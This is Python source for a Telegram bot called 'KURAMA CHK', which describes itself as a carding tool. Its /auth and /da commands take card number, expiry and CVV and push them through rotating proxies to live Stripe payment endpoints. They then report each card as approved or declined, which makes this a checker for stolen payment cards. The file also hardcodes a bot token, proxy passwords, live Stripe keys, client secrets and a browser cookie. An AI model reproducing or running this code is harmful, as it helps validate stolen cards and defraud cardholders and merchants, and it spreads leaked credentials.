import logging
from logging import Handler, handlers
from multiprocessing import context
import os
from signal import Handlers
from turtle import update
import requests
import time
import string
import random
from urllib.request import urlopen
import json
import string
import random

from aiogram import Bot, Dispatcher, executor, types
from aiogram.types import ReplyKeyboardMarkup, ReplyKeyboardRemove, KeyboardButton
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from random import randint



from aiogram import Bot, Dispatcher, executor, types
from bs4 import BeautifulSoup


##
uniproxy = requests.session()
uniproxy.proxies = uniproxy 
##

proxys = {
    'http':'http://xvpdohon-rotate:j3hvas2j91cd@p.webshare.io:80/',
    'https': 'http://bnvudhvm-rotate:jkgnyp9lecnr@p.webshare.io:80/',
    'https':'http://kpsldceh-rotate:58keli6fhazy@p.webshare.io:80/',
    'https':'http://urzeqtzv-rotate:f24yk1gwccta@p.webshare.io:80/',
    'https':'http://oiinvlnx-rotate:r2lx2vr4jbjo@p.webshare.io:80/',
    'https':'http://xvpdohon-rotate:j3hvas2j91cd@p.webshare.io:80/',
    'https':'http://bnvudhvm-rotate:jkgnyp9lecnr@p.webshare.io:80/',
    'https':'http://kpsldceh-rotate:58keli6fhazy@p.webshare.io:80/',
    'https':'http://urzeqtzv-rotate:f24yk1gwccta@p.webshare.io:80/',
    'https':'http://oiinvlnx-rotate:r2lx2vr4jbjo@p.webshare.io:80/',
    'https':'http://hftsdyhr-rotate:iziwp0qs6av1@p.webshare.io:80/'}


comand = "/.,*"
bot = bool(os.environ.get('bot', True))
token = os.environ.get("token", None)

bot = Bot(token="6055899490:AAEfy1wViQ54O62uJL6tmVfOK8co88GQjvE", parse_mode=types.ParseMode.HTML)
iniciar = Dispatcher(bot)

button1 = InlineKeyboardButton(text="👤Creador👤", callback_data="creador")
button2 = InlineKeyboardButton(text="🔥GATES🔥", callback_data="gate")
button3 = InlineKeyboardButton(text="💰SCRAPPER FREE💰", callback_data="randomvalue_of10")
keyboard_inline = InlineKeyboardMarkup().add(button1, button2, button3)

admins = [1402370393]



@iniciar.callback_query_handler(text=["randomvalue_of10", "creador", "gate"])
async def random_value(call: types.CallbackQuery):
    if call.data == "creador":
        await call.message.answer("🔥BOT CREATE BY🔥: @DarwinOficial")
    if call.data == "gate":
        await call.message.answer("""
<b>LISTA DE GATES 𝐊𝐔𝐑𝐀𝐌𝐀 𝐂𝐇𝐊 </b>

○ /auth:    Stripe [1] || Status: On ✅
○ /da:   Stripe [2] || Status: On ✅
○ /au:   Stripe [3] || Status: On ✅
○ /ku:   Stripe [4] || Status: Off ❌            
                        
                        
                        
                        
                        """)
    elif call.data == "randomvalue_of10":
        await call.message.answer("💰UNETE A NUESTRO SCRAPPER GRATUITO: @KURAMAVIPSCRAPPER💰")
    await call.answer()


########################## COMDANDO START ################################


@iniciar.message_handler(commands=['start'])
async def start_answer(message: types.Message):
    await message.answer_photo('https://imgur.com/a/Q1HKwlL', "<b>Bienvenido a 𝐊𝐔𝐑𝐀𝐌𝐀 𝐂𝐇𝐊 -Creado como una herramienta Carding. Mi creador @DarwinOficial Para acceder a mas información ejecuta el comando /cmds.</b>", reply_markup=keyboard_inline)


########################## FIN COMANDO START ################################


########################## COMANDO CMDS ################################


@iniciar.message_handler(commands=["cmds"], commands_prefix=comand)
async def cmds(message: types.Message):
    cmd = await message.reply("<b>LISTA DE COMANDOS 𝐊𝐔𝐑𝐀𝐌𝐀 𝐂𝐇𝐊 </b>")
    time.sleep(1)
    await cmd.edit_text("""
<b>LISTA DE COMANDOS 𝐊𝐔𝐑𝐀𝐌𝐀 𝐂𝐇𝐊 </b>

○ /cmds  ✅
○ /gates ✅
○ /bin ✅
○ /ip  ✅

                        """)
                        
########################## FIN COMANDO CMDS ################################




########################## COMDANDO GATES ################################


@iniciar.message_handler(commands=["gates"], commands_prefix=comand)
async def gates(message: types.Message):
    cmd = await message.reply("<b>LISTA DE COMANDOS 𝐊𝐔𝐑𝐀𝐌𝐀 𝐂𝐇𝐊 </b>")
    time.sleep(1)
    await cmd.edit_text("""
<b>LISTA DE GATES 𝐊𝐔𝐑𝐀𝐌𝐀 𝐂𝐇𝐊 </b>

○ /auth:    Stripe [1] || Status: On ✅
○ /da:   Stripe [2] || Status: On ✅
○ /au:   Stripe [3] || Status: On ✅
○ /ku:   Stripe [4] || Status: Off ❌            
                                       
                        """)
########################## FIN COMANDO GATES ################################


########################## INFO BIN ################################

@iniciar.message_handler(commands=['bin'], commands_prefix=comand)
async def helpstr(message: types.Message):
    await message.answer_chat_action("typing")
    BIN = message.text[len("/bin "): 11]
    if len(BIN) < 6:
        return await message.reply("<b>❗️ ERROR INGRESE BIEN EL BIN  ❗️</b>")
    if not BIN:
        return await message.reply("Did u Really Know how to use me.")
    bin1 = await message.reply(f"<b>💳BIN: {BIN}\nᴘʀᴏᴄᴇss: [🔴]</b>")
    apis1 = uniproxy.get(f"https://bins-su-ani.vercel.app/api/{BIN}").json()
    

    result=apis1['result']
    msg=apis1['message']
    data=apis1['data']
    vendor=data['vendor']
    bn=data['bin']
    typ=data['type']
    lv=data['level']
    bank=data['bank']
    country=data['country']
    countryinfo=data['countryInfo']
    name=countryinfo['name']
    emoji=countryinfo['emoji']
    cd=countryinfo['code']
    dialCode=countryinfo['dialCode']
    
    
    bin2 = await bin1.edit_text(f"<b>💳BIN: {BIN}\nᴘʀᴏᴄᴇss: [🔴][🟡]</b>")
    time.sleep(1)
    bin3 = await bin2.edit_text(f"<b>💳BIN: {BIN}\nᴘʀᴏᴄᴇss: [🔴][🟡][🟢]</b>")

    await bin3.edit_text(f"""
<b> ✅ INFORMACIÓN DEL BIN
‗‗‗‗‗‗‗❈❈‗‗‗‗‗‗‗

▪️RESULTADO  : {result}
▪️BIN : ¨{bn}
▪️VENDOR : {vendor}
▪️TYPE : {typ}
▪️LEVEL : {lv}
▪️BANK : {bank}
▪️COUNTRY : {country}
▪️NAME : {name}
▪️EMOJI : {emoji}
▪️CODE : {cd}
▪️DIALCODE : {dialCode}</b>
""")

########################## FIN INFO BIN ################################

########################## GENERADOR DE CCS ################################
@iniciar.message_handler(commands=['ip'], commands_prefix=comand)
async def helpstr(message: types.Message):
    contra = await message.reply("<b>ᴘʀᴏᴄᴇss: ❗ Comprobando acceso ❗</b>")
    time.sleep(1)
    user = message.from_user.id
    if user in admins :
        await contra.edit_text('Estas autorizado!')
    
    else:
        await contra.edit_text('❗ No tienes acceso para utilizar este comando. ❗ Contacta a @DarwinOficial.')
        return str;
    inputm = message.text.split(None, 1)[1]
    bincode = 20
    ips = inputm[:bincode]

    if not ips:

        return await contra.edit_text("<b>Porfavor ingrear de esta forma <code>/ip 80.23.91.3</code></b>")

    headers = {
    'authority': 'hidemy.name',
    'accept': '*/*',
    'accept-language': 'es-ES,es;q=0.9',
    'cookie': 'cf_chl_2=060605e2d5849dd; cf_clearance=BgcUQsyqF9vcXFPATMEBGKbXQjFmeS4kRE.ZX6aEixk-1674139628-0-150; _ym_uid=1674139633839203636; _ym_d=1674139633; _gid=GA1.2.1372383888.1674139633; PAPVisitorId=85320c0c63d8e22228e4f1dab057a946; PAPVisitorId=85320c0c63d8e22228e4f1dab057a946; _fbp=fb.1.1674139632934.1441874144; _ym_isad=2; _tt_enable_cookie=1; _ttp=GkHW0OTk0oRI3METxPaY_0FM_rU; _gat_UA-90263203-1=1; _dc_gtm_UA-90263203-1=1; _ga=GA1.2.1560894947.1674139633; _ga_KJFZ3PJZP3=GS1.1.1674139632.1.1.1674139985.0.0.0',
    'origin': 'https://hidemy.name',
    'referer': 'https://hidemy.name/es/proxy-checker/',
    'sec-ch-ua': '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',}
    data = {
    'ip': ips,
    }
    
    response = requests.post('https://hidemy.name/api/geoip.php?out=js&htmlentities', headers=headers, data=data)
    jsom = response.json()

    await contra.edit_text(jsom)
########################### FIN DEL GENERADOR DE CCS #######################




 ################## GATE AUTH ######################################   

@iniciar.message_handler(commands=["auth"], commands_prefix=comand)
async def auth(message: types.Message):
    ini = time.perf_counter()
    ccs = message.text[len('/auth '):]
    ccs1 = ccs
    if not ccs1:
        await message.reply("❗ ERROR INGRESE BIEN LA TARJETA  ❗")
    
    spli = ccs.split('|')
    cc = spli[0]
    mes = spli[1]
    ano = spli[2]
    cvv = spli[3] 
    m1 = await message.reply(f"<b>💳ᴄᴀʀᴅ: {ccs}\nᴘʀᴏᴄᴇss: [🔴]</b>")
    
    nombre = "Andres"
    correo = "jefersonbenthanpalacio@gmail.com"

    cabeza= {
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',
    'accept': '*/*',
    'content-type': 'text/plain;charset=UTF-8'
    }
    

    apigate2 = uniproxy.post('https://m.stripe.com/6', headers=cabeza).json()

    muid = apigate2["muid"]
    guid = apigate2["guid"]
    sid = apigate2["sid"]
    
    
    apis = uniproxy.get(f"https://bins-su-ani.vercel.app/api/{cc[:6]}").json()

    result=apis['result']
    msg=apis['message']
    data=apis['data']
    vendor=data['vendor']
    bn=data['bin']
    typ=data['type']
    lv=data['level']
    bank=data['bank']
    country=data['country']
    countryinfo=data['countryInfo']
    name=countryinfo['name']
    emoji=countryinfo['emoji']
    cd=countryinfo['code']
    dialCode=countryinfo['dialCode']
    #await message.reply(f"""
    #<code> {sid} </code>
    #<code> {muid} </code>
    #<code> {guid} </code>""")

    heade= {
    "authority": "api.stripe.com",
    "method": "POST",
    "path": "/v1/payment_intents/pi_3MNqSWHKSiz0kTyd1fdRymj6/confirm",
    "scheme": "https",
    "accept": "application/json",
    "accept-encoding": "gzip, deflate, br",
    "accept-language": "es-ES,es;q=0.9",
    "content-length": "790",
    "content-type": "application/x-www-form-urlencoded",
    "dnt": "1",
    "origin": "https://js.stripe.com",
    "referer": "https://js.stripe.com/",
    #"sec-ch-ua": "Not?A_Brand";v="8", "Chromium";v="108", "Google Chrome";v="108",
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": "Windows",
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"}


    data = f'payment_method_data[type]=card&payment_method_data[billing_details][name]={nombre}+&payment_method_data[card][number]={cc}&payment_method_data[card][cvc]={cvv}&payment_method_data[card][exp_month]={mes}&payment_method_data[card][exp_year]={ano}&payment_method_data[guid]={guid}&payment_method_data[muid]={muid}&payment_method_data[sid]={sid}&payment_method_data[pasted_fields]=number&payment_method_data[payment_user_agent]=stripe.js%2Facd3f7780%3B+stripe-js-v3%2Facd3f7780&payment_method_data[time_on_page]=28789&expected_payment_method_type=card&use_stripe_sdk=true&key=pk_live_iHIxB7OJrLLocOUih5WWEfc3&client_secret=pi_3MNqyaHKSiz0kTyd07Hr9Z2T_secret_medWP9r4hBOHTmVpoUQnjBcjs'
    
    apigate2 = uniproxy.post("https://api.stripe.com/v1/payment_intents/pi_3MNqyaHKSiz0kTyd07Hr9Z2T/confirm", headers=heade, data=data).json()
    code = apigate2['error']['code']
    code2 = apigate2['error']['message']
    

 

    final = time.perf_counter() 
    m2 = await m1.edit_text(f"<b>💳ᴄᴀʀᴅ: {ccs}\nᴘʀᴏᴄᴇss: [🔴][🟡]</b>")
    m3 = await m2.edit_text(f"<b>💳ᴄᴀʀᴅ: {ccs}\nᴘʀᴏᴄᴇss: [🔴][🟡][🟢]</b>")

    time.sleep(1)
    
            
    if "Your card's security code is incorrect." in code2:
        await m3.edit_text(f""" 
<b>▫️CHARGED AUTH▫️</b>
                       
╔═══════════════════════╗                       
  π<b>▫️CC➞</b> <code>{ccs}</code>
 ════════════════════════
  π<b>▫️Estado➞</b> 𝑨𝒑𝒑𝒓𝒐𝒗𝒆𝒅 𝑪𝑪𝑵 ✅
  π<b>▫️Respuesta➞</b> {code2}
  π<b>▫️charged➞ $1.00 </b>
 ════════════════════════
  π<b>▫️BIN➞</b> {bn}
  π<b>▫️BANCO➞</b> {bank}  
  π<b>▫️TIPO➞</b> {typ}-{vendor}-{lv}
  π<b>▫️PAÍS➞</b> {country}-{emoji}  
  π<b>▫️Tiempo➞</b>  {final-ini:0.2} (segund)
 ════════════════════════
 〽️<b>▫️Bot By➞</b> @DarwinOficial
╚═══════════════════════╝ """)
        
    if "incorrect_number" in code:
        await m3.edit_text(f""" 
<b>▫️CHARGED AUTH▫️</b>
                       
╔═══════════════════════╗                       
  π<b>▫️CC➞</b> <code>{ccs}</code>
 ════════════════════════
  π<b>▫️Estado➞</b> 𝑪𝒂𝒓𝒅 𝑫𝒆𝒄𝒍𝒊𝒏𝒆𝒅 ❌
  π<b>▫️Respuesta➞</b> {code2}
  π<b>▫️charged➞ $1.00 </b>
 ════════════════════════
  π<b>▫️BIN➞</b> {bn}
  π<b>▫️BANCO➞</b> {bank}  
  π<b>▫️TIPO➞</b> {typ}-{vendor}-{lv}
  π<b>▫️PAÍS➞</b> {country}-{emoji}  
  π<b>▫️Tiempo➞</b>  {final-ini:0.2} (segund)
 ════════════════════════
 〽️<b>▫️Bot By➞</b> @DarwinOficial
╚═══════════════════════╝ """)
        
    if "You have exceeded the maximum number of declines on this card in the last 24 hour period. Please contact us via https://support.stripe.com/contact if you need further assistance." in code2:
        await m3.edit_text(f""" 
<b>▫️CHARGED AUTH▫️</b>
                       
╔═══════════════════════╗                       
  π<b>▫️CC➞</b> <code>{ccs}</code>
 ════════════════════════
  π<b>▫️Estado➞</b> 𝑪𝒂𝒓𝒅 𝑫𝒆𝒄𝒍𝒊𝒏𝒆𝒅 ❌
  π<b>▫️Respuesta➞</b> {code2}
  π<b>▫️charged➞ $1.00 </b>
 ════════════════════════
  π<b>▫️BIN➞</b> {bn}
  π<b>▫️BANCO➞</b> {bank}  
  π<b>▫️TIPO➞</b> {typ}-{vendor}-{lv}
  π<b>▫️PAÍS➞</b> {country}-{emoji}  
  π<b>▫️Tiempo➞</b>  {final-ini:0.2} (segund)
 ════════════════════════
 〽️<b>▫️Bot By➞</b> @DarwinOficial
╚═══════════════════════╝ """)
        
        
    if "Your card's security code is invalid." in code2:
        await m3.edit_text(f""" 
<b>▫️CHARGED AUTH▫️</b>
                       
╔═══════════════════════╗                       
  π<b>▫️CC➞</b> <code>{ccs}</code>
 ════════════════════════
  π<b>▫️Estado➞</b> 𝑪𝒂𝒓𝒅 𝑫𝒆𝒄𝒍𝒊𝒏𝒆𝒅 ❌
  π<b>▫️Respuesta➞</b> {code2}
  π<b>▫️charged➞ $1.00 </b>
 ════════════════════════
  π<b>▫️BIN➞</b> {bn}
  π<b>▫️BANCO➞</b> {bank}  
  π<b>▫️TIPO➞</b> {typ}-{vendor}-{lv}
  π<b>▫️PAÍS➞</b> {country}-{emoji}  
  π<b>▫️Tiempo➞</b>  {final-ini:0.2} (segund)
 ════════════════════════
 〽️<b>▫️Bot By➞</b> @DarwinOficial
╚═══════════════════════╝ """)
        
        
    if "Your card does not support this type of purchase." in code2:
        await m3.edit_text(f""" 
<b>▫️CHARGED AUTH▫️</b>
                       
╔═══════════════════════╗                      
  π<b>▫️CC➞</b> <code>{ccs}</code>
 ════════════════════════
  π<b>▫️Estado➞</b> 𝑪𝒂𝒓𝒅 𝑫𝒆𝒄𝒍𝒊𝒏𝒆𝒅 ❌
  π<b>▫️Respuesta➞</b> {code2}
  π<b>▫️charged➞ $1.00 </b>
 ════════════════════════
  π<b>▫️BIN➞</b> {bn}
  π<b>▫️BANCO➞</b> {bank}  
  π<b>▫️TIPO➞</b> {typ}-{vendor}-{lv}
  π<b>▫️PAÍS➞</b> {country}-{emoji}  
  π<b>▫️Tiempo➞</b>  {final-ini:0.2} (segund)
 ════════════════════════
 〽️<b>▫️Bot By➞</b> @DarwinOficial
╚═══════════════════════╝ """)
        
        
    if "Your card's expiration year is invalid." in code2:
        await m3.edit_text(f""" 
<b>▫️CHARGED AUTH▫️</b>
                       
╔═══════════════════════╗                       
  π<b>▫️CC➞</b> <code>{ccs}</code>
 ════════════════════════
  π<b>▫️Estado➞</b> 𝑪𝒂𝒓𝒅 𝑫𝒆𝒄𝒍𝒊𝒏𝒆𝒅 ❌
  π<b>▫️Respuesta➞</b> {code2}
  π<b>▫️charged➞ $1.00 </b>
 ════════════════════════
  π<b>▫️BIN➞</b> {bn}
  π<b>▫️BANCO➞</b> {bank}  
  π<b>▫️TIPO➞</b> {typ}-{vendor}-{lv}
  π<b>▫️PAÍS➞</b> {country}-{emoji}  
  π<b>▫️Tiempo➞</b>  {final-ini:0.2} (segund)
 ════════════════════════
 〽️<b>▫️Bot By➞</b> @DarwinOficial
╚═══════════════════════╝ """)
        
        
    if "Your card has insufficient funds." in code2:
        await m3.edit_text(f""" 
<b>▫️CHARGED AUTH▫️</b>
                       
╔═══════════════════════╗                       
  π<b>▫️CC➞</b> <code>{ccs}</code>
 ════════════════════════
  π<b>▫️Estado➞</b> 𝑨𝒑𝒑𝒓𝒐𝒗𝒆𝒅 ✅
  π<b>▫️Respuesta➞</b> {code2}
  π<b>▫️charged➞ $1.00 </b>
 ════════════════════════
  π<b>▫️BIN➞</b> {bn}
  π<b>▫️BANCO➞</b> {bank}  
  π<b>▫️TIPO➞</b> {typ}-{vendor}-{lv}
  π<b>▫️PAÍS➞</b> {country}-{emoji}  
  π<b>▫️Tiempo➞</b>  {final-ini:0.2} (segund)
 ════════════════════════
 〽️<b>▫️Bot By➞</b> @DarwinOficial
╚═══════════════════════╝ """)
    
    if "Your card was declined." in code2:
        await m3.edit_text(f""" 
<b>▫️CHARGED AUTH▫️</b>
                       
╔═══════════════════════╗                       
  π<b>▫️CC➞</b> <code>{ccs}</code>
 ════════════════════════
  π<b>▫️Estado➞</b> 𝑪𝒂𝒓𝒅 𝑫𝒆𝒄𝒍𝒊𝒏𝒆𝒅 ❌
  π<b>▫️Respuesta➞</b> {code2}
  π<b>▫️charged➞ $1.00 </b>
 ════════════════════════
  π<b>▫️BIN➞</b> {bn}
  π<b>▫️BANCO➞</b> {bank}  
  π<b>▫️TIPO➞</b> {typ}-{vendor}-{lv}
  π<b>▫️PAÍS➞</b> {country}-{emoji}  
  π<b>▫️Tiempo➞</b>  {final-ini:0.2} (segund)
 ════════════════════════
 〽️<b>▫️Bot By➞</b> @DarwinOficial
╚═══════════════════════╝ """)
    
        
            


@iniciar.message_handler(commands=['da'], commands_prefix=comand)
async def da(message: types.Message):
    contra = await message.reply("<b>ᴘʀᴏᴄᴇss: ❗ Comprobando acceso ❗</b>")
    time.sleep(1)
    user = message.from_user.id
    if user in admins :
        await contra.edit_text('Estas autorizado!')
    
    else:
        await contra.edit_text('❗ No tienes acceso para utilizar este comando. ❗ Contacta a @DarwinOficial.')
        return str;
    ini = time.perf_counter()
    ccs = message.text[len('/da '):]
    
    if not ccs:
        await contra.edit_text("❗ ERROR INGRESE BIEN LA TARJETA ❗")

    spli = ccs.split('|')
    cc = spli[0]
    mes = spli[1]
    ano = spli[2]
    cvv = spli[3]
    m1 = await contra.edit_text(f"<b>💳ᴄᴀʀᴅ: {ccs}\nᴘʀᴏᴄᴇss: [🔴]</b>") 
    
    nombre = "darwin moreno belardo"
    mail = "darwinmoreno366773@yahoo.com"


    apis44 = uniproxy.get(f"https://bins-su-ani.vercel.app/api/{cc[:6]}").json()

    result=apis44['result']
    msg=apis44['message']
    data=apis44['data']
    vendor=data['vendor']
    bn=data['bin']
    typ=data['type']
    lv=data['level']
    bank=data['bank']
    country=data['country']
    countryinfo=data['countryInfo']
    name=countryinfo['name']
    emoji=countryinfo['emoji']
    cd=countryinfo['code']
    dialCode=countryinfo['dialCode']

    
    
   
    head22 = {
    'user-agent': 'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 Edg/108.0.1462.54',
    'accept': '*/*',
    'content-type': 'text/plain;charset=UTF-8'
    }
    
    api1 = uniproxy.post("https://m.stripe.com/6", headers=head22).json()
    muid = api1["muid"]
    guid = api1["guid"]
    sid = api1["sid"]
    
    headers33 = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'es-419,es;q=0.9,es-ES;q=0.8,en;q=0.7,en-GB;q=0.6,en-US;q=0.5',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://checkout.stripe.com',
    'referer': 'https://checkout.stripe.com/',
    'sec-ch-ua': '"Not_A Brand";v="99", "Microsoft Edge";v="109", "Chromium";v="109"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36 Edg/109.0.1518.55',
    }

    data = f'type=card&card[number]={cc}&card[cvc]={cvv}&card[exp_month]={mes}&card[exp_year]={ano}&billing_details[name]={nombre}+moreno&billing_details[email]=zdxrnavckbhwh%40triots.com&billing_details[address][country]=US&billing_details[address][postal_code]=10080&guid={guid}&muid={muid}&sid={sid}&key=pk_live_51LsYR6AKFjq10TnePvmDsUU6mDT7UzQSmvz3RchEeBz6AQqfrnH9L16mD8hcajweCoaPUxDuCKVPFZdPjBl4f5XC00JTPKVfby&payment_user_agent=stripe.js%2Fe9a259df8%3B+stripe-js-v3%2Fe9a259df8%3B+checkout'

    response333 = uniproxy.post('https://api.stripe.com/v1/payment_methods', headers=headers33, data=data).json()
    id = response333['id']


    headers44 = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'es-419,es;q=0.9,es-ES;q=0.8,en;q=0.7,en-GB;q=0.6,en-US;q=0.5',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://checkout.stripe.com',
    'referer': 'https://checkout.stripe.com/',
    'sec-ch-ua': '"Not_A Brand";v="99", "Microsoft Edge";v="109", "Chromium";v="109"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'user-agent': 'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36 Edg/109.0.1518.55',
    }

    data22 = f'eid=NA&payment_method={id}&expected_amount=100&last_displayed_line_item_group_details[subtotal]=100&last_displayed_line_item_group_details[total_exclusive_tax]=0&last_displayed_line_item_group_details[total_inclusive_tax]=0&last_displayed_line_item_group_details[total_discount_amount]=0&last_displayed_line_item_group_details[shipping_rate_amount]=0&expected_payment_method_type=card&key=pk_live_51LsYR6AKFjq10TnePvmDsUU6mDT7UzQSmvz3RchEeBz6AQqfrnH9L16mD8hcajweCoaPUxDuCKVPFZdPjBl4f5XC00JTPKVfby'

    response22 = uniproxy.post('https://api.stripe.com/v1/payment_pages/cs_live_a1uHRs9txmLbfbO8adULufenB6hZMXHKhJW2glnTbpyTwZx5agSQmY9CNL/confirm', headers=headers44, data=data22).json()
    error1 = response22['error']['code']
    error2 = response22['error']['message']
    
    
    final = time.perf_counter() 
    m2 = await m1.edit_text(f"<b>💳ᴄᴀʀᴅ: {ccs}\nᴘʀᴏᴄᴇss: [🔴][🟡]</b>")
    m3 = await m2.edit_text(f"<b>💳ᴄᴀʀᴅ: {ccs}\nᴘʀᴏᴄᴇss: [🔴][🟡][🟢]</b>")

    time.sleep(1)
    
            
    if "Your card's security code is incorrect." in error2:
        await m3.edit_text(f""" 
<b>▫️CHARGED AUTH▫️</b>
                       
╔═══════════════════════╗                       
  π<b>▫️CC➞</b> <code>{ccs}</code>
 ════════════════════════
  π<b>▫️Estado➞</b> 𝑨𝒑𝒑𝒓𝒐𝒗𝒆𝒅 𝑪𝑪𝑵 ✅
  π<b>▫️Respuesta➞</b> {error2}
  π<b>▫️charged➞ $1.00 </b>
 ════════════════════════
  π<b>▫️BIN➞</b> {bn}
  π<b>▫️BANCO➞</b> {bank}  
  π<b>▫️TIPO➞</b> {typ}-{vendor}-{lv}
  π<b>▫️PAÍS➞</b> {country}-{emoji}  
  π<b>▫️Tiempo➞</b>  {final-ini:0.2} (segund)
 ════════════════════════
 〽️<b>▫️Bot By➞</b> @DarwinOficial
╚═══════════════════════╝ """)
        
    if "incorrect_number" in error2:
        await m3.edit_text(f""" 
<b>▫️CHARGED AUTH▫️</b>
                       
╔═══════════════════════╗                       
  π<b>▫️CC➞</b> <code>{ccs}</code>
 ════════════════════════
  π<b>▫️Estado➞</b> 𝑪𝒂𝒓𝒅 𝑫𝒆𝒄𝒍𝒊𝒏𝒆𝒅 ❌
  π<b>▫️Respuesta➞</b> {error2}
  π<b>▫️charged➞ $1.00 </b>
 ════════════════════════
  π<b>▫️BIN➞</b> {bn}
  π<b>▫️BANCO➞</b> {bank}  
  π<b>▫️TIPO➞</b> {typ}-{vendor}-{lv}
  π<b>▫️PAÍS➞</b> {country}-{emoji}  
  π<b>▫️Tiempo➞</b>  {final-ini:0.2} (segund)
 ════════════════════════
 〽️<b>▫️Bot By➞</b> @DarwinOficial
╚═══════════════════════╝ """)
        
    if "You have exceeded the maximum number of declines on this card in the last 24 hour period. Please contact us via https://support.stripe.com/contact if you need further assistance." in error2:
        await m3.edit_text(f""" 
<b>▫️CHARGED AUTH▫️</b>
                       
╔═══════════════════════╗                       
  π<b>▫️CC➞</b> <code>{ccs}</code>
 ════════════════════════
  π<b>▫️Estado➞</b> 𝑪𝒂𝒓𝒅 𝑫𝒆𝒄𝒍𝒊𝒏𝒆𝒅 ❌
  π<b>▫️Respuesta➞</b> {error2}
  π<b>▫️charged➞ $1.00 </b>
 ════════════════════════
  π<b>▫️BIN➞</b> {bn}
  π<b>▫️BANCO➞</b> {bank}  
  π<b>▫️TIPO➞</b> {typ}-{vendor}-{lv}
  π<b>▫️PAÍS➞</b> {country}-{emoji}  
  π<b>▫️Tiempo➞</b>  {final-ini:0.2} (segund)
 ════════════════════════
 〽️<b>▫️Bot By➞</b> @DarwinOficial
╚═══════════════════════╝ """)
        
        
    if "Your card's security code is invalid." in error2:
        await m3.edit_text(f""" 
<b>▫️CHARGED AUTH▫️</b>
                       
╔═══════════════════════╗                       
  π<b>▫️CC➞</b> <code>{ccs}</code>
 ════════════════════════
  π<b>▫️Estado➞</b> 𝑪𝒂𝒓𝒅 𝑫𝒆𝒄𝒍𝒊𝒏𝒆𝒅 ❌
  π<b>▫️Respuesta➞</b> {error2}
  π<b>▫️charged➞ $1.00 </b>
 ════════════════════════
  π<b>▫️BIN➞</b> {bn}
  π<b>▫️BANCO➞</b> {bank}  
  π<b>▫️TIPO➞</b> {typ}-{vendor}-{lv}
  π<b>▫️PAÍS➞</b> {country}-{emoji}  
  π<b>▫️Tiempo➞</b>  {final-ini:0.2} (segund)
 ════════════════════════
 〽️<b>▫️Bot By➞</b> @DarwinOficial
╚═══════════════════════╝ """)
        
        
    if "Your card does not support this type of purchase." in error2:
        await m3.edit_text(f""" 
<b>▫️CHARGED AUTH▫️</b>
                       
╔═══════════════════════╗                      
  π<b>▫️CC➞</b> <code>{ccs}</code>
 ════════════════════════
  π<b>▫️Estado➞</b> 𝑪𝒂𝒓𝒅 𝑫𝒆𝒄𝒍𝒊𝒏𝒆𝒅 ❌
  π<b>▫️Respuesta➞</b> {error2}
  π<b>▫️charged➞ $1.00 </b>
 ════════════════════════
  π<b>▫️BIN➞</b> {bn}
  π<b>▫️BANCO➞</b> {bank}  
  π<b>▫️TIPO➞</b> {typ}-{vendor}-{lv}
  π<b>▫️PAÍS➞</b> {country}-{emoji}  
  π<b>▫️Tiempo➞</b>  {final-ini:0.2} (segund)
 ════════════════════════
 〽️<b>▫️Bot By➞</b> @DarwinOficial
╚═══════════════════════╝ """)
        
        
    if "Your card's expiration year is invalid." in error2:
        await m3.edit_text(f""" 
<b>▫️CHARGED AUTH▫️</b>
                       
╔═══════════════════════╗                       
  π<b>▫️CC➞</b> <code>{ccs}</code>
 ════════════════════════
  π<b>▫️Estado➞</b> 𝑪𝒂𝒓𝒅 𝑫𝒆𝒄𝒍𝒊𝒏𝒆𝒅 ❌
  π<b>▫️Respuesta➞</b> {error2}
  π<b>▫️charged➞ $1.00 </b>
 ════════════════════════
  π<b>▫️BIN➞</b> {bn}
  π<b>▫️BANCO➞</b> {bank}  
  π<b>▫️TIPO➞</b> {typ}-{vendor}-{lv}
  π<b>▫️PAÍS➞</b> {country}-{emoji}  
  π<b>▫️Tiempo➞</b>  {final-ini:0.2} (segund)
 ════════════════════════
 〽️<b>▫️Bot By➞</b> @DarwinOficial
╚═══════════════════════╝ """)
        
        
    if "Your card has insufficient funds." in error2:
        await m3.edit_text(f""" 
<b>▫️CHARGED AUTH▫️</b>
                       
╔═══════════════════════╗                       
  π<b>▫️CC➞</b> <code>{ccs}</code>
 ════════════════════════
  π<b>▫️Estado➞</b> 𝑨𝒑𝒑𝒓𝒐𝒗𝒆𝒅 ✅
  π<b>▫️Respuesta➞</b> {error2}
  π<b>▫️charged➞ $1.00 </b>
 ════════════════════════
  π<b>▫️BIN➞</b> {bn}
  π<b>▫️BANCO➞</b> {bank}  
  π<b>▫️TIPO➞</b> {typ}-{vendor}-{lv}
  π<b>▫️PAÍS➞</b> {country}-{emoji}  
  π<b>▫️Tiempo➞</b>  {final-ini:0.2} (segund)
 ════════════════════════
 〽️<b>▫️Bot By➞</b> @DarwinOficial
